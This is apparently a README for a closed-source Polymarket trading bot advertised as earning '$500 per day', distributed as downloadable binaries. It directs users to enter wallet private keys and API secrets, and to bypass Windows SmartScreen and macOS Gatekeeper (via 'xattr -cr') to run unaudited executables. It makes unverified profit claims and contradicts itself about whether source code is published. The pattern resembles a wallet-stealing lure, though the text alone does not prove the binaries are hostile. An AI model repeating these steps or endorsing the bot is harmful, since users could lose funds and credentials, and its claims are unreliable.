# PMTraderAdamBot — $500 Per Day Polymarket Bot

> **Automated trading bot for Polymarket** built for delta-momentum up/down market strategies.

The bot executes a custom strategy by buying shares in prediction markets. It monitors crypto price feeds, detects momentum spikes, and places orders on Polymarket up/down markets.

This repo is a **distribution package** — documentation, performance proof, and ready-to-run binaries for **Windows, Linux, and macOS**. The proprietary strategy engine is **not** open-sourced; it is shared so traders who want to participate on Polymarket can run the same live system without building from source.

---

## Download & Run

<p align="center">
  <img src="https://img.shields.io/badge/Windows-x86__64-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Windows" />
  <img src="https://img.shields.io/badge/Linux-x86__64-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux" />
  <img src="https://img.shields.io/badge/macOS-Apple_Silicon-555555?style=for-the-badge&logo=apple&logoColor=white" alt="macOS Apple Silicon" />
  <img src="https://img.shields.io/badge/Setup-No_install_·_No_Node-22C55E?style=for-the-badge" alt="No install required" />
</p>

<p align="center">
  <strong>Download, unzip, configure, and run.</strong><br />
  <sub>Pre-built binaries · same engine behind the track record below · Node.js not required</sub>
</p>

<table align="center">
  <tr>
    <td align="center" width="220" style="padding: 16px;">
      <a href="https://github.com/PMTraderAdam/PMTraderAdam/raw/main/bin/500-per-day-polymarket-bot-windows-x86_64.zip">
        <img src="https://img.shields.io/badge/⬇_Windows-500--per--day--polymarket--bot-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows build" height="40" />
      </a>
      <br /><br />
      <code>bin/500-per-day-polymarket-bot-windows-x86_64.zip</code>
      <br />
      <sub>~10 MB · includes <code>500-per-day-polymarket-bot-windows-x86_64.exe</code></sub>
    </td>
    <td align="center" width="220" style="padding: 16px;">
      <a href="https://github.com/PMTraderAdam/PMTraderAdam/raw/main/bin/500-per-day-polymarket-bot-linux-x86_64.zip">
        <img src="https://img.shields.io/badge/⬇_Linux-500--per--day--polymarket--bot-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Download Linux build" height="40" />
      </a>
      <br /><br />
      <code>bin/500-per-day-polymarket-bot-linux-x86_64.zip</code>
      <br />
      <sub>~9 MB · includes <code>500-per-day-polymarket-bot-linux-x86_64</code></sub>
    </td>
    <td align="center" width="220" style="padding: 16px;">
      <a href="https://github.com/PMTraderAdam/PMTraderAdam/raw/main/bin/500-per-day-polymarket-bot-macos-arm64.zip">
        <img src="https://img.shields.io/badge/⬇_macOS-500--per--day--polymarket--bot-555555?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS build" height="40" />
      </a>
      <br /><br />
      <code>bin/500-per-day-polymarket-bot-macos-arm64.zip</code>
      <br />
      <sub>~6 MB · Apple Silicon (arm64)</sub>
    </td>
  </tr>
</table>

### Quick start

| | |
|:--:|:--|
| **1** | Download the zip for your platform from [`bin/`](bin/) and unzip it into any folder |
| **2** | Run the binary once — a `config.json` is created automatically on first launch |
| **3** | Open `config.json` and add your Polymarket wallet credentials |
| **4** | Keep `simulation_mode: true` while testing; switch to `false` for live orders |
| **5** | Run the binary again — the bot connects to feeds and starts monitoring markets |

<details>
<summary><strong>Windows</strong></summary>

```cmd
500-per-day-polymarket-bot-windows-x86_64.exe
```

Double-click the `.exe`, or run from Command Prompt. If Windows SmartScreen blocks the file, choose **Run anyway** or launch from CMD.

</details>

<details>
<summary><strong>Linux</strong></summary>

```bash
unzip 500-per-day-polymarket-bot-linux-x86_64.zip
chmod +x 500-per-day-polymarket-bot-linux-x86_64
./500-per-day-polymarket-bot-linux-x86_64
```

</details>

<details>
<summary><strong>macOS (Apple Silicon)</strong></summary>

```bash
unzip 500-per-day-polymarket-bot-macos-arm64.zip
chmod +x 500-per-day-polymarket-bot-macos-arm64
./500-per-day-polymarket-bot-macos-arm64
```

If macOS Gatekeeper blocks the app, open **System Settings → Privacy & Security** and click **Open Anyway**, or run `xattr -cr 500-per-day-polymarket-bot-macos-arm64` once before launching.

</details>

### What you get vs. what stays private

<table>
  <tr>
    <th width="50%" align="center">✅ Included in this repo</th>
    <th width="50%" align="center">🔒 Not published</th>
  </tr>
  <tr>
    <td valign="top">
      <ul>
        <li>Pre-built binaries — Windows, Linux, macOS (<code>bin/</code>)</li>
        <li>Strategy docs &amp; config template</li>
        <li>Performance screenshots</li>
        <li>Setup instructions</li>
      </ul>
    </td>
    <td valign="top">
      <ul>
        <li>Core strategy source code</li>
        <li>Signal &amp; execution internals</li>
        <li>Proprietary tuning logic</li>
      </ul>
    </td>
  </tr>
</table>

<p align="center">
  <sub>Shared to help Polymarket traders get started — not a full source release.</sub>
</p>

---

## Run from source

Use this path if you want to run the TypeScript bot directly instead of the pre-built binaries in [`bin/`](bin/).

### Prerequisites

- **Node.js 20+** — [nodejs.org](https://nodejs.org/) or `nvm install 20`
- **Git** — clone this repo, or download and unzip the source

### Setup

```bash
git clone <repo-url>
cd 500-per-day-polymarket-bot
npm install
```

On macOS/Linux you can use the Makefile instead:

```bash
make install    # npm install
make env        # copies .env.example → .env if missing
```

### Configure credentials

Secrets live in **`.env`** (never commit this file). Copy the template and fill in your wallet:

```bash
cp .env.example .env
```

On Windows (PowerShell): `Copy-Item .env.example .env`

| Variable | Purpose |
|----------|---------|
| `DAWN_EXECUTION__PRIVATE_KEY` | Wallet private key for order signing |
| `DAWN_EXECUTION__FUNDER` | Polymarket proxy / funder address |
| `DAWN_EXECUTION__API_KEY` | CLOB API key (required for live trading) |
| `DAWN_EXECUTION__API_SECRET` | CLOB API secret |
| `DAWN_EXECUTION__API_PASSPHRASE` | CLOB API passphrase |
| `DAWN_BOT__MODE` | `paper` (default) or `live` |
| `DAWN_EXECUTION__ENABLED` | `false` = simulate · `true` = place real CLOB orders |

Strategy and runtime settings are in **`config/default.yaml`** — assets, momentum thresholds, order size, risk limits, and API URLs. Edit this file to tune the bot; keep keys in `.env` only.

**Paper trading (recommended first):** leave defaults in `.env`:

```env
DAWN_BOT__MODE=paper
DAWN_EXECUTION__ENABLED=false
```

**Live trading:** set `DAWN_BOT__MODE=live`, `DAWN_EXECUTION__ENABLED=true`, and fill in all execution credentials above.

### Run the bot

**Development** — runs TypeScript directly with hot reload via `tsx`:

```bash
npm run bot
# or
npm run dev
```

**Production** — compile then run the built JavaScript:

```bash
npm run build
npm start
```

**Makefile shortcuts** (macOS/Linux):

```bash
make bot      # npm run bot -- --config config/default.yaml
make start    # build + node dist/index.js
```

**Custom config file:**

```bash
npm run bot -- --config path/to/my-config.yaml
```

On startup the bot syncs server time with Polymarket CLOB, connects to price feeds, and begins monitoring configured markets. Logs and trade data are written under `data/` (see `storage` in `config/default.yaml`).

Press `Ctrl+C` to stop.

### Source vs. pre-built binaries

| | Pre-built binary (`bin/`) | Source (`npm run bot`) |
|--|-----------------------------|------------------------|
| **Config** | `config.json` (auto-created on first run) | `config/default.yaml` + `.env` |
| **Node.js** | Not required | Node 20+ required |
| **Best for** | Quick setup on Windows, Linux, or macOS | Custom tuning, development, inspecting logs |

---

## Track Record

Live results from the strategy this bot automates — consistent execution across crypto up/down markets and event-driven positions.

<table>
  <tr>
    <td width="50%" align="center" valign="top">
      <img src="data/1B0Zz6mT.png" alt="Polymarket profile overview with total profit and biggest wins" width="420" />
      <p><strong>All-time edge</strong><br />
      <sub>+$22K realized profit with a steady equity curve and documented high-conviction wins across sports, tech, and macro markets.</sub></p>
    </td>
    <td width="50%" align="center" valign="top">
      <img src="data/HKqeD_mWIAA2e8z.jpg" alt="Polymarket profile dashboard showing profit and loss chart" width="420" />
      <p><strong>Live dashboard</strong><br />
      <sub>900+ resolved predictions, $27K+ positions value, and a compounding PnL curve — the same execution stack this binary runs in production.</sub></p>
    </td>
  </tr>
  <tr>
    <td width="50%" align="center" valign="top">
      <img src="data/HKHOtFvWIAAg_eu.jpg" alt="Past day profit of over twelve hundred dollars" width="420" />
      <p><strong>Daily momentum</strong><br />
      <sub>+$1,229 in a single session — delta-momentum entries firing on short-interval crypto up/down windows when price breaks threshold.</sub></p>
    </td>
    <td width="50%" align="center" valign="top">
      <img src="data/HKfOx4TW8AA4qok.jpg" alt="Hive World Cup trading competition entry card" width="420" />
      <p><strong>Battle-tested</strong><br />
      <sub>Competing in the Hive World Cup on a $500 bankroll — the same risk-adjusted sizing model in the default config.</sub></p>
    </td>
  </tr>
</table>

<p align="center">
  <sub>Past performance does not guarantee future results. See <a href="#disclaimer">Disclaimer</a>.</sub>
</p>

---

## Features

- Automated buying based on custom strategy parameters
- Real-time execution on Polymarket
- Risk management and position sizing logic
- Easy to monitor and tweak via `config.json`
- Trade logging to `trades.log` and `data/`
- Designed for crypto up/down and prediction markets

---

## Configuration

On first run, the bot writes `config.json` next to the executable. Edit these fields before going live:

```json
{
  "polymarket": {
    "private_key": "your_private_key",
    "proxy_wallet_address": "your_funder_address",
    "signature_type": 2
  },
  "strategy": {
    "symbols": ["btc", "eth", "sol"],
    "simulation_mode": true,
    "limit_price": 0.50,
    "trade_shares": 5
  }
}
```

| Field | Purpose |
|-------|---------|
| `private_key` | Wallet key for order signing — **never share** |
| `proxy_wallet_address` | Polymarket proxy / funder address |
| `simulation_mode` | `true` = paper trade · `false` = live CLOB orders |
| `symbols` | Assets to monitor (`btc`, `eth`, `sol`, `xrp`) |
| `strategy.momentum.*` | Per-asset USD delta threshold & lookback window |
| `limit_price` / `trade_shares` | Order price and position size |

**Security:** Keep `config.json` local. Never commit keys to Git or share screenshots with credentials visible.

---

## Strategy

The bot follows a **delta-momentum + beat-cross** strategy:

1. Track a live crypto price feed over a lookback window
2. Fire when `|Δ|` exceeds the per-asset USD threshold
3. Resolve **UP** vs **DOWN** using the beat price at market open
4. Place limit buys on Polymarket CLOB (auto-cancel if unfilled)

Tune thresholds in `config.json` under `strategy.momentum` — start conservative and scale after paper testing.

---

## Disclaimer

> **Trading prediction markets involves substantial risk of loss.**  
> This software is provided **as-is** for educational and personal use only.  
> Past performance does not guarantee future results.  
> The authors are not responsible for any financial losses.  
> Use at your own risk. Always start with small amounts and paper trade when possible.

---

## License

The pre-built binaries and documentation are provided for personal use. Core strategy source code is proprietary and not licensed for redistribution or reverse engineering.
